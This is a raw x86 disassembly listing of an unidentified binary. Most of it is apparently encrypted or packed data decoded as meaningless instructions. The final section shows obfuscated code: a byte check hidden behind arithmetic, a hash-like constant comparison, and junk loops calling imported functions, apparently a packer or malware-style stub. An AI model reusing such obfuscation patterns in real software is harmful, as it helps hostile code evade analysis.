  41b0de:	ja     0x41b0f9
  41b0e0:	pop    es
  41b0e1:	hlt    
  41b0e2:	sahf   
  41b0e3:	out    0xf2,al
  41b0e5:	ins    BYTE PTR es:[edi],dx
  41b0e6:	mov    edx,0x25da1be0
  41b0eb:	std    
  41b0ec:	sub    ah,0x55
  41b0ef:	mov    edx,0x6cf501d2
  41b0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f5:	mov    ds:0x3b4f5938,al
  41b0fa:	xor    BYTE PTR [eax+0x19a2411b],ch
  41b100:	in     eax,0xca
  41b102:	out    dx,eax
  41b103:	fadd   DWORD PTR [edx-0x38]
  41b106:	dec    ecx
  41b107:	idiv   DWORD PTR [edi]
  41b109:	and    al,0x1b
  41b10b:	retf   
  41b10c:	ret    
  41b10d:	popf   
  41b10e:	data16 and ah,dl
  41b111:	or     al,ah
  41b113:	mov    BYTE PTR [edi-0x1],dh
  41b116:	mov    WORD PTR [edi-0x27],ss
  41b119:	addr16 aas 
  41b11b:	iret   
  41b11c:	fstp   DWORD PTR [edi]
  41b11e:	fisubr DWORD PTR [edx-0x2d17c1e5]
  41b124:	js     0x41b12c
  41b126:	pop    esp
  41b127:	aam    0xc2
  41b129:	mov    bl,0xf
  41b12b:	std    
  41b12c:	pop    edi
  41b12d:	sub    cl,BYTE PTR [edx-0x78909223]
  41b133:	test   BYTE PTR gs:[esi],dl
  41b136:	ja     0x41b17d
  41b138:	xchg   edx,eax
  41b139:	dec    edi
  41b13a:	(bad)
  41b13d:	loopne 0x41b1a6
  41b13f:	(bad)  
  41b140:	mov    bl,0x90
  41b142:	xor    eax,DWORD PTR [ecx+0x2f]
  41b145:	fsub   DWORD PTR [ebx+0x1f]
  41b148:	sbb    DWORD PTR [ecx+0xc],esi
  41b14b:	sbb    DWORD PTR [eax],0xffffffea
  41b14e:	jecxz  0x41b0f4
  41b150:	lods   eax,DWORD PTR ds:[esi]
  41b151:	adc    DWORD PTR [ecx+0x16d6ea51],0x375044d4
  41b15b:	fist   DWORD PTR [ebx]
  41b15d:	fcom   DWORD PTR [ebx-0x3b]
  41b160:	jecxz  0x41b123
  41b162:	jle    0x41b17c
  41b164:	jp     0x41b157
  41b166:	xchg   edx,eax
  41b167:	jo     0x41b14c
  41b169:	cmp    ecx,DWORD PTR [eax]
  41b16b:	cmp    al,0xb4
  41b16d:	xlat   BYTE PTR ds:[ebx]
  41b16e:	out    dx,al
  41b16f:	jno    0x41b190
  41b171:	ins    BYTE PTR es:[edi],dx
  41b172:	ror    DWORD PTR [edx+eiz*1-0x138d8b65],cl
  41b179:	daa    
  41b17a:	sahf   
  41b17b:	stos   DWORD PTR es:[edi],eax
  41b17c:	xor    esi,DWORD PTR [edx+0x61a9eed3]
  41b182:	pop    esi
  41b183:	sbb    esp,ebp
  41b185:	ret    0x23ee
  41b188:	cmp    al,0x9e
  41b18a:	xor    ecx,DWORD PTR [esi-0x7e07a3b6]
  41b190:	popa   
  41b191:	adc    eax,0xf6f39512
  41b196:	dec    ch
  41b198:	inc    ecx
  41b199:	and    al,0xf6
  41b19b:	sbb    eax,0xe4b069cf
  41b1a0:	scas   al,BYTE PTR es:[edi]
  41b1a1:	icebp  
  41b1a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a3:	push   0x2e
  41b1a5:	add    al,BYTE PTR [ebx+0x2d16e718]
  41b1ab:	sub    al,0xe3
  41b1ad:	das    
  41b1ae:	clc    
  41b1af:	mov    esp,fs
  41b1b1:	mov    ebx,0xf219917a
  41b1b6:	or     BYTE PTR [edi+eax*8-0x4c],bl
  41b1ba:	sar    DWORD PTR [ecx],1
  41b1bc:	mov    ch,BYTE PTR [ebx+0x55]
  41b1bf:	add    BYTE PTR [ebx-0x6b],bl
  41b1c2:	ja     0x41b23a
  41b1c4:	mov    ah,0x22
  41b1c6:	in     al,0xc8
  41b1c8:	xor    al,0x44
  41b1ca:	ret    
  41b1cb:	inc    edi
  41b1cc:	std    
  41b1cd:	test   al,bh
  41b1cf:	inc    esp
  41b1d0:	lods   eax,DWORD PTR ds:[esi]
  41b1d1:	or     eax,0xe70e3b0b
  41b1d6:	inc    esi
  41b1d7:	stos   BYTE PTR es:[edi],al
  41b1d8:	sub    al,0xeb
  41b1da:	loop   0x41b15e
  41b1dc:	test   edx,edx
  41b1de:	cli    
  41b1df:	inc    ebp
  41b1e0:	push   esp
  41b1e1:	loopne 0x41b1bc
  41b1e3:	jp     0x41b1f9
  41b1e5:	aam    0x63
  41b1e7:	sbb    bh,BYTE PTR [edx+0x7009593f]
  41b1ed:	loop   0x41b24e
  41b1ef:	mov    al,0xa7
  41b1f1:	dec    esp
  41b1f2:	aad    0x48
  41b1f4:	cmp    DWORD PTR [edi-0x46bc84e],ebx
  41b1fa:	adc    eax,0xa4945f3d
  41b1ff:	jb     0x41b1ff
  41b201:	fsub   QWORD PTR [ecx+eax*4+0x3b]
  41b205:	mov    eax,ds:0xf24e1f0f
  41b20a:	sbb    esi,DWORD PTR [ecx+0x40]
  41b20d:	sub    eax,0xb24ad05a
  41b212:	cmc    
  41b213:	inc    esi
  41b214:	mov    ecx,DWORD PTR [edi+eax*4-0x3d080e56]
  41b21b:	(bad)  
  41b21c:	or     eax,0x186900ee
  41b221:	leave  
  41b222:	push   esp
  41b223:	jle    0x41b22b
  41b225:	jno    0x41b1b9
  41b227:	loopne 0x41b1ec
  41b229:	mov    ebx,0xae4f37a3
  41b22e:	xchg   edx,eax
  41b22f:	sbb    DWORD PTR [edx],ebx
  41b231:	nop
  41b232:	(bad)  
  41b234:	jl     0x41b1b6
  41b236:	test   BYTE PTR [ecx],0xdf
  41b239:	pop    ebx
  41b23a:	xlat   BYTE PTR ds:[ebx]
  41b23b:	loopne 0x41b1d7
  41b23d:	or     al,0x1b
  41b23f:	js     0x41b1c9
  41b241:	push   ebx
  41b242:	idiv   BYTE PTR [esi+0x13]
  41b245:	iret   
  41b246:	mov    eax,ds:0x671b8fe8
  41b24b:	dec    ebp
  41b24c:	or     DWORD PTR [eax+0x6e],esp
  41b24f:	jle    0x41b264
  41b251:	xlat   BYTE PTR ds:[ebx]
  41b252:	aaa    
  41b253:	rcr    DWORD PTR [ecx],0xc1
  41b256:	cmc    
  41b257:	outs   dx,BYTE PTR ss:[si]
  41b25a:	adc    al,0xc5
  41b25c:	xchg   ecx,eax
  41b25d:	jb     0x41b2bb
  41b25f:	into   
  41b260:	das    
  41b261:	cli    
  41b262:	push   ds
  41b263:	mov    bh,0x9a
  41b265:	fs into 
  41b267:	add    DWORD PTR [eax],0xca59a309
  41b26d:	into   
  41b26e:	ficomp WORD PTR ds:0x10784e95
  41b274:	add    edx,ebp
  41b276:	test   BYTE PTR [edx+0x67e36a09],0x94
  41b27d:	cmp    bl,dl
  41b27f:	mov    esi,DWORD PTR [ebx+0x46a00e85]
  41b285:	cmp    eax,0x7a183f06
  41b28a:	dec    ebp
  41b28b:	push   ds
  41b28c:	mov    DWORD PTR [eax],ebp
  41b28e:	and    eax,0x3da1da84
  41b293:	jne    0x41b310
  41b295:	add    DWORD PTR [esi-0x74],0x28
  41b299:	sub    al,0xfe
  41b29b:	(bad)  
  41b29c:	fnstsw WORD PTR [ebx]
  41b29e:	mov    ah,0x46
  41b2a0:	(bad)  
  41b2a1:	js     0x41b2f5
  41b2a3:	pop    edi
  41b2a4:	gs inc esp
  41b2a6:	lea    ecx,ds:[ecx+0x3a]
  41b2aa:	push   ebx
  41b2ab:	ret    0xe1f6
  41b2ae:	fwait
  41b2af:	or     ah,BYTE PTR [ebp+0x6e57e0c7]
  41b2b5:	push   edx
  41b2b6:	shl    DWORD PTR [eax],cl
  41b2b8:	mov    dh,0x53
  41b2ba:	jmp    0x41b284
  41b2bc:	jnp    0x41b2c6
  41b2be:	fiadd  WORD PTR [edi+ecx*8+0x2e]
  41b2c2:	mov    bl,0x8f
  41b2c4:	dec    ebx
  41b2c5:	push   0x509d680e
  41b2ca:	lea    esi,[esi]
  41b2cc:	and    al,0x7f
  41b2ce:	hlt    
  41b2cf:	xor    ecx,DWORD PTR [edx-0x2208a4e]
  41b2d5:	and    al,0xac
  41b2d7:	pop    ebp
  41b2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2d9:	inc    ebp
  41b2da:	test   eax,0x86b795d8
  41b2df:	ret    0x7d46
  41b2e2:	push   0x6dcb9a74
  41b2e7:	jle    0x41b2a4
  41b2e9:	out    0x6d,eax
  41b2eb:	aaa    
  41b2ec:	inc    eax
  41b2ed:	or     al,0x50
  41b2ef:	push   0xa32b37bc
  41b2f4:	pop    edx
  41b2f5:	popf   
  41b2f6:	push   ebp
  41b2f7:	fs xchg ebx,eax
  41b2f9:	div    BYTE PTR [ebp+0x41]
  41b2fc:	or     DWORD PTR [ebp-0x3742fc90],ebx
  41b302:	xchg   edi,eax
  41b303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b304:	mov    DWORD PTR [ecx+0x45379f27],ecx
  41b30a:	cmp    al,0x50
  41b30c:	icebp  
  41b30d:	mov    dl,0x65
  41b30f:	dec    edx
  41b310:	fs dec esi
  41b312:	and    cl,BYTE PTR [edx+0x62d70c8c]
  41b318:	and    eax,0xb65d234
  41b31d:	dec    cl
  41b31f:	add    al,dl
  41b321:	lds    edi,FWORD PTR [ebp-0x1b]
  41b324:	test   DWORD PTR [ebx+eiz*8],edi
  41b327:	adc    dl,BYTE PTR [ecx+0x14b30a84]
  41b32d:	loopne 0x41b302
  41b32f:	add    al,0x8e
  41b332:	inc    ecx
  41b333:	mov    eax,0x68227d26
  41b338:	add    al,BYTE PTR [edx+0x61]
  41b33b:	cli    
  41b33c:	cmp    eax,0x14608c44
  41b341:	jne    0x41b30b
  41b343:	fiadd  DWORD PTR [esi]
  41b345:	fistp  DWORD PTR [edx-0x7a]
  41b348:	(bad)  [eax+0x34]
  41b34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b34c:	add    dh,ch
  41b34e:	cli    
  41b34f:	rol    DWORD PTR [eax-0x7b5d2921],0xcd
  41b356:	ret    0x47ca
  41b359:	ja     0x41b33b
  41b35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b35c:	mov    al,ds:0x2bd7d6b
  41b361:	jbe    0x41b3c6
  41b363:	mov    cl,0x84
  41b365:	clc    
  41b366:	int    0x2d
  41b368:	xor    al,0x0
  41b36a:	stc    
  41b36b:	ins    BYTE PTR es:[edi],dx
  41b36c:	aad    0xf8
  41b36e:	pop    es
  41b36f:	cmp    DWORD PTR [esi],ebp
  41b371:	mov    eax,DWORD PTR [eax]
  41b373:	enter  0x7d0f,0x3d
  41b377:	imul   ebp,DWORD PTR [edi],0xbd906bef
  41b37d:	dec    edx
  41b37e:	mov    ss,WORD PTR [ebx]
  41b380:	stos   DWORD PTR es:[edi],eax
  41b381:	cmp    BYTE PTR [ebp+0x11e96ae8],bl
  41b387:	fadd   QWORD PTR ds:0x1644cd1c
  41b38d:	and    al,0xae
  41b38f:	or     ch,0xf5
  41b392:	(bad)  
  41b393:	gs push 0x6c849f0f
  41b399:	repz xchg ecx,eax
  41b39b:	dec    ebp
  41b39c:	add    ch,BYTE PTR [ebx-0x3a]
  41b39f:	std    
  41b3a0:	test   DWORD PTR [eax-0x3b75678],edi
  41b3a6:	mov    cl,bh
  41b3a8:	pop    edx
  41b3a9:	loopne 0x41b333
  41b3ab:	pop    ecx
  41b3ac:	(bad)  
  41b3ae:	cdq    
  41b3af:	aad    0x67
  41b3b1:	addr16 test eax,0xdf1721ff
  41b3b7:	mov    edx,0xf6bd4658
  41b3bc:	pop    edi
  41b3bd:	sahf   
  41b3be:	mov    eax,0xddab1487
  41b3c3:	xchg   DWORD PTR [edx+ebp*8+0x73279c41],ebx
  41b3ca:	jne    0x41b357
  41b3cc:	mov    ah,0x90
  41b3ce:	aaa    
  41b3cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3d0:	jle    0x41b381
  41b3d2:	ret    0xa47c
  41b3d5:	fdiv   DWORD PTR [ebp+0x790bf77d]
  41b3db:	loop   0x41b3f0
  41b3dd:	mov    dl,0x91
  41b3df:	ss pop ebx
  41b3e1:	mov    ah,0xe8
  41b3e3:	xchg   ah,ch
  41b3e5:	xchg   ecx,eax
  41b3e6:	mov    ecx,0x356be663
  41b3eb:	fisttp WORD PTR [ecx-0x2db4609f]
  41b3f1:	mov    al,ds:0x333f9fa8
  41b3f6:	xchg   ebp,eax
  41b3f7:	(bad)  
  41b3f8:	xchg   ebp,eax
  41b3f9:	popf   
  41b3fa:	imul   eax,edx,0xffffffbb
  41b3fd:	mov    WORD PTR [ebp+0x7c],es
  41b400:	cmc    
  41b401:	add    BYTE PTR [ebx],al
  41b403:	adc    ecx,DWORD PTR [ecx+edi*2+0x795bb6c5]
  41b40a:	or     BYTE PTR [esp+edx*8-0x16cfa296],ah
  41b411:	mov    eax,DWORD PTR [ecx]
  41b413:	rcr    bh,0x2e
  41b416:	shr    BYTE PTR [eax+0x65],0x55
  41b41a:	nop
  41b41b:	out    dx,al
  41b41c:	scas   eax,DWORD PTR es:[edi]
  41b41d:	and    ebx,DWORD PTR [ebx]
  41b41f:	pop    eax
  41b420:	mov    BYTE PTR [ebp-0x4a],dh
  41b423:	rcr    DWORD PTR [ebp*8-0x65feb8af],1
  41b42a:	jne    0x41b411
  41b42c:	sub    ebx,DWORD PTR [edi+0x2e7640a3]
  41b432:	scas   eax,DWORD PTR es:[edi]
  41b433:	sub    DWORD PTR ds:0x49a41684,ecx
  41b439:	in     al,0x41
  41b43b:	jb     0x41b3da
  41b43d:	cli    
  41b43e:	mov    ecx,0xf6961ebd
  41b443:	mov    BYTE PTR [esi+0x62f2e27f],ah
  41b449:	sub    edi,ecx
  41b44b:	dec    ecx
  41b44c:	dec    eax
  41b44d:	mul    DWORD PTR [ebx-0x4c9919d9]
  41b453:	out    0xbc,eax
  41b455:	sub    bl,ch
  41b457:	in     al,0x0
  41b459:	cmp    ebx,DWORD PTR [esi+0x207ce159]
  41b45f:	test   DWORD PTR [esi],ebx
  41b461:	cmp    dh,dh
  41b463:	or     edi,DWORD PTR [esi+0x5802191b]
  41b469:	pop    ebx
  41b46a:	fcmovb st,st(6)
  41b46c:	fild   WORD PTR [eax+0x11]
  41b46f:	into   
  41b470:	and    BYTE PTR [ecx],dl
  41b472:	(bad)  
  41b473:	bound  ebp,QWORD PTR [esi+edx*4-0x3e7c834e]
  41b47a:	mov    ebx,0x134cc3cb
  41b47f:	mov    bh,0xf5
  41b481:	and    esp,DWORD PTR [esi*8-0x5bd6f88a]
  41b488:	xor    dl,0x46
  41b48b:	out    dx,al
  41b48c:	test   al,0x86
  41b48e:	xor    ch,bh
  41b490:	or     BYTE PTR [ecx],0x1e
  41b493:	xchg   edi,eax
  41b494:	pushf  
  41b495:	xor    DWORD PTR [esi],edx
  41b497:	dec    ebp
  41b498:	ficomp DWORD PTR [esi]
  41b49a:	cmp    eax,ebp
  41b49c:	add    BYTE PTR [ebp+0x30],bl
  41b49f:	rcl    BYTE PTR [ebx+0x423bfec3],1
  41b4a5:	jnp    0x41b469
  41b4a7:	loop   0x41b4dc
  41b4a9:	sbb    BYTE PTR [esi-0x7e367b07],0x90
  41b4b0:	cmc    
  41b4b1:	ret    
  41b4b2:	nop
  41b4b3:	mov    cl,0x60
  41b4b5:	in     al,0x2b
  41b4b7:	mov    ecx,DWORD PTR [eax-0x6f]
  41b4ba:	and    dh,BYTE PTR [ecx+0x78]
  41b4bd:	dec    edi
  41b4be:	push   ecx
  41b4bf:	jb     0x41b475
  41b4c1:	hlt    
  41b4c2:	scas   eax,DWORD PTR es:[edi]
  41b4c3:	mov    esi,0x939094fd
  41b4c8:	inc    edx
  41b4c9:	sbb    bl,cl
  41b4cb:	add    DWORD PTR [edi],0x3d9e7b8b
  41b4d1:	bound  ebp,QWORD PTR [ecx]
  41b4d3:	movzx  ebx,BYTE PTR [ecx]
  41b4d6:	es inc esp
  41b4d8:	stos   BYTE PTR es:[edi],al
  41b4d9:	cdq    
  41b4da:	sahf   
  41b4db:	sub    ah,BYTE PTR [ecx]
  41b4dd:	arpl   WORD PTR ds:0xaad97282,bp
  41b4e3:	sahf   
  41b4e4:	outs   dx,DWORD PTR ds:[esi]
  41b4e5:	mov    ds:0xa39322ef,eax
  41b4ea:	xor    al,0xb5
  41b4ec:	and    bl,0x3b
  41b4ef:	mov    WORD PTR ds:0x366ad9b4,ds
  41b4f5:	sar    BYTE PTR [edi+0x284a1ee3],1
  41b4fb:	sub    ch,ch
  41b4fd:	in     al,0xdb
  41b4ff:	cmp    BYTE PTR [ebp-0x22],dh
  41b502:	cs mov ch,0x41
  41b505:	and    eax,0x65880e31
  41b50a:	inc    ebp
  41b50b:	sahf   
  41b50c:	sub    esp,0x76
  41b50f:	inc    esi
  41b510:	sbb    al,0x58
  41b512:	mov    dh,BYTE PTR [edx+0x9]
  41b515:	cwde   
  41b516:	fdivr  QWORD PTR [ebp-0x17f8e657]
  41b51c:	mov    edi,0x67c8b7e9
  41b521:	cmp    al,0x74
  41b523:	xchg   ecx,eax
  41b524:	test   BYTE PTR [ebx-0x11],bh
  41b527:	call   0x4e33acf4
  41b52c:	cdq    
  41b52d:	enter  0xbca7,0xfe
  41b531:	imul   ebp,DWORD PTR [ecx+ebp*4+0x58],0x7cd4065b
  41b539:	(bad)  
  41b53a:	pop    edi
  41b53b:	mov    eax,0x7b602fcd
  41b540:	icebp  
  41b541:	cmc    
  41b542:	bound  ebx,QWORD PTR [edi+0x52]
  41b545:	in     eax,dx
  41b546:	push   ebx
  41b547:	loop   0x41b5bf
  41b549:	daa    
  41b54a:	dec    eax
  41b54b:	pcmpeqd mm5,QWORD PTR [edx-0x128e8b62]
  41b552:	xchg   edi,eax
  41b553:	in     eax,dx
  41b554:	repnz xchg ecx,eax
  41b556:	fld    TBYTE PTR [edx]
  41b558:	mov    ah,0x0
  41b55a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b55b:	sar    BYTE PTR ds:[edi],cl
  41b55e:	fs call 0x891880e2
  41b564:	adc    ch,dl
  41b566:	push   0x1a
  41b568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b569:	repnz push esi
  41b56b:	imul   eax,DWORD PTR [eax-0x1d],0xd73dd737
  41b572:	jae    0x41b550
  41b574:	fwait
  41b575:	shr    ch,1
  41b577:	fld    DWORD PTR [ecx+0x26]
  41b57a:	shl    BYTE PTR ss:[ebx],cl
  41b57d:	repz bnd call 0x7ecd2ae3
  41b584:	fidiv  WORD PTR [edx-0x794711f6]
  41b58a:	call   0xb4b5ec3f
  41b58f:	sub    DWORD PTR [esi-0x57],0xffffffbe
  41b593:	loope  0x41b5e3
  41b595:	mov    dh,BYTE PTR [edi-0x4]
  41b598:	rcr    ebp,0x99
  41b59b:	add    BYTE PTR [ecx],dl
  41b59d:	pop    ecx
  41b59e:	push   es
  41b59f:	popa   
  41b5a0:	mov    ebx,0x3aa999f2
  41b5a5:	pop    eax
  41b5a6:	or     DWORD PTR [eax*4-0x57ae3e4e],0x7a7155c0
  41b5b1:	daa    
  41b5b2:	mov    ecx,0x82872a14
  41b5b7:	test   DWORD PTR [ebp-0x70],ebx
  41b5ba:	iret   
  41b5bb:	cvtps2pi mm2,QWORD PTR [ebp+0x1989ea0c]
  41b5c2:	outs   dx,BYTE PTR ds:[esi]
  41b5c3:	mov    edi,0x341ed074
  41b5c8:	scas   eax,DWORD PTR es:[edi]
  41b5c9:	push   cs
  41b5ca:	fdivrp st(2),st
  41b5cc:	or     BYTE PTR [ecx],0x9f
  41b5cf:	test   eax,0x499314a7
  41b5d4:	stos   BYTE PTR es:[edi],al
  41b5d5:	adc    BYTE PTR [ecx+0x11dc69e8],ah
  41b5db:	jl     0x41b633
  41b5dd:	pop    edi
  41b5de:	dec    edx
  41b5df:	push   edi
  41b5e0:	shl    BYTE PTR [ecx-0x49],cl
  41b5e3:	aas    
  41b5e4:	lahf   
  41b5e5:	imul   ecx,DWORD PTR [edx-0xda42481],0x7fee89de
  41b5ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5f0:	cmp    cl,ch
  41b5f2:	inc    ebp
  41b5f3:	xor    eax,0xcd839d8
  41b5f8:	jmp    0xd9b3:0xf69f167c
  41b5ff:	aaa    
  41b600:	ins    BYTE PTR es:[edi],dx
  41b601:	sub    BYTE PTR [ebx+0x3f8c4288],al
  41b607:	inc    esi
  41b608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b609:	sbb    BYTE PTR [ecx],ch
  41b60b:	mov    bl,0x96
  41b60d:	ret    0x7b8
  41b610:	lods   al,BYTE PTR ds:[esi]
  41b611:	add    ebp,edx
  41b613:	push   0x2d841d29
  41b618:	push   edx
  41b619:	and    esp,esi
  41b61b:	xor    ah,BYTE PTR [eax+eax*8]
  41b61e:	inc    ebp
  41b61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b620:	xchg   esi,eax
  41b621:	cmp    al,0xbf
  41b623:	fmul   DWORD PTR [ecx-0x67]
  41b626:	pop    es
  41b627:	ror    BYTE PTR [ebp-0x7a],0xaa
  41b62b:	mov    dh,0x3
  41b62d:	pop    ss
  41b62e:	push   ebx
  41b62f:	jb     0x41b5ce
  41b631:	ins    BYTE PTR es:[edi],dx
  41b632:	(bad)  
  41b633:	retf   
  41b634:	dec    esi
  41b635:	mov    WORD PTR [ecx],es
  41b637:	cli    
  41b638:	ins    BYTE PTR es:[edi],dx
  41b639:	push   0xe2169cef
  41b63e:	aaa    
  41b63f:	in     eax,0x15
  41b641:	push   ss
  41b642:	jb     0x41b653
  41b644:	int    0x10
  41b646:	test   BYTE PTR [edi-0x52],ch
  41b649:	jo     0x41b6c5
  41b64b:	sar    DWORD PTR [ebx-0x2d],1
  41b64e:	dec    esi
  41b64f:	mov    bl,0x6
  41b651:	sar    ecx,cl
  41b653:	gs xchg ebp,eax
  41b655:	push   edx
  41b656:	lods   eax,DWORD PTR ds:[esi]
  41b657:	daa    
  41b658:	pop    eax
  41b659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b65a:	pop    eax
  41b65b:	mov    DWORD PTR [ecx],edx
  41b65d:	or     ecx,DWORD PTR [esi+0x13]
  41b660:	push   cs
  41b661:	in     eax,dx
  41b662:	mov    BYTE PTR [ebp-0x291279c1],ch
  41b668:	pop    esp
  41b669:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66b:	inc    ecx
  41b66c:	push   es
  41b66d:	mov    ebx,ebp
  41b66f:	xor    al,BYTE PTR [edi+0x7d]
  41b672:	pop    ds
  41b673:	sbb    ebp,eax
  41b675:	sar    DWORD PTR [esi+0x5e],0xa7
  41b679:	cmp    DWORD PTR [ebp+0x4d],0x99c50e13
  41b680:	xor    al,0x4
  41b682:	jge    0x41b68d
  41b684:	xor    al,0xba
  41b686:	or     DWORD PTR [edx+0x1a5bd714],eax
  41b68c:	pop    edi
  41b68d:	pop    edx
  41b68e:	fstp   DWORD PTR [edi]
  41b690:	cmp    edi,DWORD PTR [edx]
  41b692:	or     ebp,DWORD PTR [esi]
  41b694:	sbb    cl,BYTE PTR [ebp-0x5]
  41b697:	jbe    0x41b64a
  41b699:	or     BYTE PTR [edx],dl
  41b69b:	lock mov ebx,0xdd9b0133
  41b6a1:	pushf  
  41b6a2:	or     al,0x60
  41b6a4:	pop    esi
  41b6a5:	xchg   ebx,eax
  41b6a6:	and    DWORD PTR [esi+edi*1+0x68e02bd1],ebp
  41b6ad:	fisubr DWORD PTR [edx]
  41b6af:	jmp    0x41b6d1
  41b6b1:	jae    0x41b6d3
  41b6b3:	(bad)  
  41b6b4:	(bad)  
  41b6b5:	sahf   
  41b6b6:	(bad)
  41b6b9:	in     eax,dx
  41b6ba:	fwait
  41b6bb:	inc    edx
  41b6bc:	(bad)  
  41b6bd:	mov    esp,0x44efa94f
  41b6c2:	ins    DWORD PTR es:[edi],dx
  41b6c3:	not    BYTE PTR [ebp-0x6d9d25ae]
  41b6c9:	icebp  
  41b6ca:	loope  0x41b6b4
  41b6cc:	lods   eax,DWORD PTR ds:[esi]
  41b6cd:	aas    
  41b6ce:	or     ebp,DWORD PTR [eax]
  41b6d0:	dec    edi
  41b6d1:	mov    BYTE PTR [eax-0x69],dh
  41b6d4:	jne    0x41b65a
  41b6d6:	and    dl,BYTE PTR [edi+0x5deeeeee]
  41b6dc:	push   ebp
  41b6dd:	dec    edx
  41b6de:	sub    al,BYTE PTR [ecx]
  41b6e0:	jae    0x41b712
  41b6e2:	adc    dl,al
  41b6e4:	mov    ah,BYTE PTR [edx-0x7be4ad35]
  41b6ea:	addr16 mov al,0x4
  41b6ed:	xchg   DWORD PTR [ecx+eax*2],ebx
  41b6f0:	xor    ebx,DWORD PTR [edi-0x1b434235]
  41b6f6:	jae    0x41b727
  41b6f8:	arpl   bp,sp
  41b6fa:	add    DWORD PTR [ebx+ecx*2+0x8ac0439],ebp
  41b701:	fst    QWORD PTR [ecx-0x29]
  41b704:	mov    dh,0x30
  41b706:	push   edi
  41b707:	imul   ebx,DWORD PTR [edi],0xffffffee
  41b70a:	loope  0x41b6cb
  41b70c:	test   al,0xd8
  41b70e:	ret    
  41b70f:	adc    BYTE PTR [edx+edi*4+0x64dbdcde],bh
  41b716:	cdq    
  41b717:	cmp    BYTE PTR [edx+0x39],al
  41b71a:	and    al,0x72
  41b71c:	pop    ebp
  41b71d:	hlt    
  41b71e:	mov    DWORD PTR [ecx-0x29],eax
  41b721:	je     0x41b72e
  41b723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b724:	pop    esp
  41b725:	cwde   
  41b726:	or     DWORD PTR [edi],eax
  41b728:	push   es
  41b729:	adc    al,0x82
  41b72b:	mov    ds:0xbccda5bd,al
  41b730:	daa    
  41b731:	inc    ebx
  41b732:	cld    
  41b733:	xchg   DWORD PTR ds:0x13c68083,esp
  41b739:	jg     0x41b718
  41b73b:	mov    DWORD PTR [ebp-0x14],ecx
  41b73e:	mov    ecx,DWORD PTR [ebp-0x14]
  41b741:	mov    ecx,DWORD PTR [ecx+0xc]
  41b744:	movsx  cx,BYTE PTR [ecx+eax*1]
  41b749:	mov    edx,0x3b4b
  41b74e:	sub    cx,dx
  41b751:	mov    edx,0x8a85
  41b756:	xor    cx,dx
  41b759:	mov    edx,0x4f85
  41b75e:	cmp    cx,dx
  41b761:	jne    0x419376
  41b767:	mov    ecx,DWORD PTR ds:0x423f9a
  41b76d:	mov    ecx,DWORD PTR [ecx+0x198]
  41b773:	mov    DWORD PTR [ecx],eax
  41b775:	jmp    0x41b79b
  41b77a:	mov    ecx,DWORD PTR [ebp+0x18]
  41b77d:	cmp    ecx,0xf89c85b5
  41b783:	jne    0x41b79b
  41b789:	push   eax
  41b78a:	push   DWORD PTR [ebp+0x14]
  41b78d:	push   DWORD PTR [ebp+0x10]
  41b790:	push   DWORD PTR [ebp+0xc]
  41b793:	push   DWORD PTR [ebp+0x8]
  41b796:	call   0x416ab7
  41b79b:	pop    edi
  41b79c:	pop    esi
  41b79d:	leave  
  41b79e:	ret    0x14
  41b7a1:	push   ebp
  41b7a2:	mov    ebp,esp
  41b7a4:	sub    esp,0x48
  41b7a7:	push   ebx
  41b7a8:	movzx  eax,BYTE PTR ds:0x42901c
  41b7af:	sub    DWORD PTR ds:0x429010,eax
  41b7b5:	push   esi
  41b7b6:	adc    DWORD PTR ds:0x429000,0x3a05
  41b7c0:	push   edi
  41b7c1:	xor    edi,0x559a
  41b7c7:	xor    esi,esi
  41b7c9:	mov    DWORD PTR [ebp-0x20],esi
  41b7cc:	sub    eax,0x6d46
  41b7d1:	mov    eax,DWORD PTR [ebp-0xc]
  41b7d4:	push   0x5
  41b7d6:	and    DWORD PTR ds:0x42b010,0x0
  41b7e0:	mov    edi,DWORD PTR ds:0x42b010
  41b7e6:	inc    edi
  41b7e7:	mov    DWORD PTR ds:0x42b010,edi
  41b7ed:	cmp    DWORD PTR ds:0x42b010,0x1e
  41b7f4:	jne    0x41b80f
  41b7fa:	push   0x4aeb
  41b7ff:	push   0x362c
  41b804:	push   0x611c
  41b809:	call   DWORD PTR ds:0x425044
  41b80f:	cmp    DWORD PTR ds:0x42b010,0x11
  41b816:	jb     0x41b7e0
  41b81c:	and    DWORD PTR ds:0x429020,0x0
  41b826:	jmp    0x41b838
  41b82b:	mov    edi,DWORD PTR ds:0x429020
  41b831:	inc    edi
  41b832:	mov    DWORD PTR ds:0x429020,edi
  41b838:	cmp    DWORD PTR ds:0x429020,0x1b
  41b83f:	jae    0x41b8d2
  41b845:	cmp    DWORD PTR ds:0x429020,0x5
  41b84c:	jne    0x41b86a
  41b852:	push   0x6d5d
  41b857:	push   0x6bd3
  41b85c:	push   0x2a83
  41b861:	push   DWORD PTR [ebp-0x20]
  41b864:	call   DWORD PTR ds:0x425048
  41b86a:	cmp    DWORD PTR ds:0x429020,0x4
  41b871:	jne    0x41b884
  41b877:	mov    edi,DWORD PTR ds:0x429020
  41b87d:	inc    edi
  41b87e:	mov    DWORD PTR ds:0x429020,edi
  41b884:	jmp    0x41b82b
  41b889:	mov    DWORD PTR ds:0x42901c,0x1a
  41b893:	cmp    DWORD PTR ds:0x42901c,0x0
  41b89a:	je     0x41b8d2
  41b8a0:	cmp    DWORD PTR ds:0x42901c,0x29
  41b8a7:	jne    0x41b8b8
  41b8ad:	push   0x3b9c
  41b8b2:	call   DWORD PTR ds:0x42504c
  41b8b8:	xor    edi,edi
  41b8ba:	or     edi,DWORD PTR ds:0x42901c
  41b8c0:	dec    edi
